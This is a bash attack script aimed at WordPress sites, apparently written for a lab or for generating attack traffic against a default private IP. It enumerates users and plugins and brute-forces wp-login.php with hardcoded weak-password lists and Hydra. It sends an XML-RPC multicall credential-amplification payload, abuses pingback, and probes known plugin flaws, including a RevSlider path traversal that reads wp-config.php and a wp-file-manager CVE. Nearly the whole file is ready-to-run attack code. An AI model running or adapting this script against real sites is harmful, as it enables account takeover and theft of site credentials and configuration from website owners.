#!/bin/bash
###############################################################################
# WordPress Attack Script
# WPScan enumeration, wp-login brute force, XML-RPC multicall, plugin exploits
###############################################################################

SUBTYPE="${1:-full}"
TARGET_IP="${2:-10.10.40.30}"
TARGET_PORT="${3:-80}"
RESULTS_DIR="${4:-.}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
WORDLISTS_DIR="${SCRIPT_DIR}/wordlists"
BASE_URL="http://${TARGET_IP}:${TARGET_PORT}"

mkdir -p "$RESULTS_DIR"

echo "[*] WordPress attacks: $SUBTYPE against ${BASE_URL}"

run_enum() {
    echo "[*] WordPress enumeration"

    # WPScan enumeration (if available)
    if command -v wpscan &>/dev/null; then
        echo "[*] Running WPScan..."
        wpscan --url "$BASE_URL" --enumerate u,p,t,tt \
            --random-user-agent \
            --output "${RESULTS_DIR}/wpscan_enum.txt" \
            --format cli \
            --no-update 2>&1 || true
    else
        echo "[!] wpscan not found, using manual enumeration"
    fi

    # Manual user enumeration
    echo "[*] User enumeration via author parameter..."
    for i in $(seq 1 20); do
        response=$(curl -sk -o /dev/null -w "%{http_code}" "${BASE_URL}/?author=${i}" 2>&1)
        if [[ "$response" == "301" ]] || [[ "$response" == "200" ]]; then
            curl -sk "${BASE_URL}/?author=${i}" -L -o /dev/null \
                -w "Author ID ${i}: %{url_effective}\n" \
                >> "${RESULTS_DIR}/wp_users.txt" 2>&1 || true
        fi
        sleep 0.5
    done

    # REST API user enumeration
    echo "[*] REST API user enumeration..."
    curl -sk "${BASE_URL}/wp-json/wp/v2/users" \
        > "${RESULTS_DIR}/wp_api_users.json" 2>&1 || true

    # Plugin/theme enumeration
    echo "[*] Probing common plugins..."
    local plugins=("akismet" "contact-form-7" "yoast-seo" "jetpack"
                   "woocommerce" "elementor" "wp-file-manager" "duplicator"
                   "revslider" "easy-wp-smtp" "all-in-one-seo-pack"
                   "wordfence" "updraftplus" "really-simple-ssl")

    for plugin in "${plugins[@]}"; do
        code=$(curl -sk -o /dev/null -w "%{http_code}" "${BASE_URL}/wp-content/plugins/${plugin}/readme.txt" 2>&1)
        if [[ "$code" == "200" ]]; then
            echo "[+] Found plugin: $plugin" | tee -a "${RESULTS_DIR}/wp_plugins_found.txt"
        fi
        sleep 0.3
    done

    # Version detection
    curl -sk "${BASE_URL}/readme.html" > "${RESULTS_DIR}/wp_readme.html" 2>&1 || true
    curl -sk "${BASE_URL}/wp-login.php" > "${RESULTS_DIR}/wp_login_page.html" 2>&1 || true

    echo "[+] WordPress enumeration complete"
}

run_brute() {
    echo "[*] WordPress login brute force"

    local users=("admin" "administrator" "editor" "author" "wordpress" "wp" "root")
    local passwords=("admin" "password" "123456" "admin123" "wordpress" "wp"
                     "password123" "letmein" "welcome" "changeme")

    # wp-login.php brute force
    for user in "${users[@]}"; do
        for pass in "${passwords[@]}"; do
            curl -sk -X POST "${BASE_URL}/wp-login.php" \
                -d "log=${user}&pwd=${pass}&wp-submit=Log+In" \
                -o /dev/null -w "  ${user}:${pass} -> %{http_code}\n" \
                >> "${RESULTS_DIR}/wp_brute.txt" 2>&1 || true
            sleep 0.5
        done
    done

    # Hydra against wp-login if available
    if command -v hydra &>/dev/null; then
        echo "[*] Hydra wp-login brute force..."
        hydra -L "${WORDLISTS_DIR}/wordpress_users.txt" \
              -P "${WORDLISTS_DIR}/small_passwords.txt" \
              -t 4 -f \
              "${TARGET_IP}" http-post-form \
              "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect" \
              2>&1 | tee "${RESULTS_DIR}/wp_hydra.txt" || true
    fi

    echo "[+] WordPress brute force complete"
}

run_xmlrpc() {
    echo "[*] XML-RPC multicall amplification attack"

    # Check if XML-RPC is enabled
    echo "[*] Checking XML-RPC availability..."
    curl -sk -X POST "${BASE_URL}/xmlrpc.php" \
        -H "Content-Type: text/xml" \
        -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' \
        > "${RESULTS_DIR}/xmlrpc_methods.xml" 2>&1 || true

    # Multicall brute force (amplified)
    echo "[*] XML-RPC multicall credential amplification..."
    local passwords=("admin" "password" "123456" "admin123" "test" "wordpress"
                     "password123" "letmein" "welcome" "changeme" "root"
                     "qwerty" "abc123" "monkey" "master")

    # Build multicall payload
    local payload='<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>'

    for pass in "${passwords[@]}"; do
        payload+="<value><struct>
            <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
            <member><name>params</name><value><array><data>
                <value><string>admin</string></value>
                <value><string>${pass}</string></value>
            </data></array></value></member>
        </struct></value>"
    done

    payload+='</data></array></value></param></params></methodCall>'

    # Send amplified request
    for i in $(seq 1 5); do
        curl -sk -X POST "${BASE_URL}/xmlrpc.php" \
            -H "Content-Type: text/xml" \
            -d "$payload" \
            -o "${RESULTS_DIR}/xmlrpc_multicall_${i}.xml" 2>&1 || true
        sleep 2
    done

    # Pingback abuse
    echo "[*] XML-RPC pingback probe..."
    curl -sk -X POST "${BASE_URL}/xmlrpc.php" \
        -H "Content-Type: text/xml" \
        -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://10.10.20.20:8888/</string></value></param><param><value><string>'"${BASE_URL}"'/?p=1</string></value></param></params></methodCall>' \
        -o "${RESULTS_DIR}/xmlrpc_pingback.xml" 2>&1 || true

    echo "[+] XML-RPC attacks complete"
}

run_plugin() {
    echo "[*] Plugin vulnerability scanning"

    # WPScan vulnerability mode (if API token available)
    if command -v wpscan &>/dev/null; then
        wpscan --url "$BASE_URL" --enumerate vp,vt \
            --random-user-agent \
            --output "${RESULTS_DIR}/wpscan_vulns.txt" \
            --format cli \
            --no-update 2>&1 || true
    fi

    # Manual plugin exploit probes
    echo "[*] Probing known plugin vulnerabilities..."

    # wp-file-manager RCE (CVE-2020-25213)
    curl -sk "${BASE_URL}/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php" \
        -o /dev/null -w "wp-file-manager connector: %{http_code}\n" \
        >> "${RESULTS_DIR}/wp_plugin_vulns.txt" 2>&1 || true

    # Duplicator installer
    curl -sk "${BASE_URL}/wp-content/plugins/duplicator/installer/main.installer.php" \
        -o /dev/null -w "duplicator installer: %{http_code}\n" \
        >> "${RESULTS_DIR}/wp_plugin_vulns.txt" 2>&1 || true

    # RevSlider file inclusion
    curl -sk "${BASE_URL}/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php" \
        -o /dev/null -w "revslider LFI: %{http_code}\n" \
        >> "${RESULTS_DIR}/wp_plugin_vulns.txt" 2>&1 || true

    # All-in-One Migration
    curl -sk "${BASE_URL}/wp-content/plugins/all-in-one-wp-migration/storage/" \
        -o /dev/null -w "all-in-one-migration storage: %{http_code}\n" \
        >> "${RESULTS_DIR}/wp_plugin_vulns.txt" 2>&1 || true

    # WP debug log
    curl -sk "${BASE_URL}/wp-content/debug.log" \
        -o "${RESULTS_DIR}/wp_debug_log.txt" 2>&1 || true

    # wp-config backup
    curl -sk "${BASE_URL}/wp-config.php.bak" -o /dev/null 2>&1 || true
    curl -sk "${BASE_URL}/wp-config.php~" -o /dev/null 2>&1 || true
    curl -sk "${BASE_URL}/wp-config.old" -o /dev/null 2>&1 || true

    echo "[+] Plugin vulnerability scanning complete"
}

case "$SUBTYPE" in
    enum)       run_enum ;;
    brute)      run_brute ;;
    xmlrpc)     run_xmlrpc ;;
    plugin)     run_plugin ;;
    full)
        run_enum
        sleep 5
        run_brute
        sleep 5
        run_xmlrpc
        sleep 5
        run_plugin
        ;;
    *)
        echo "Unknown subtype: $SUBTYPE"
        echo "Available: enum, brute, xmlrpc, plugin, full"
        exit 1
        ;;
esac

echo "[*] WordPress attack script complete"
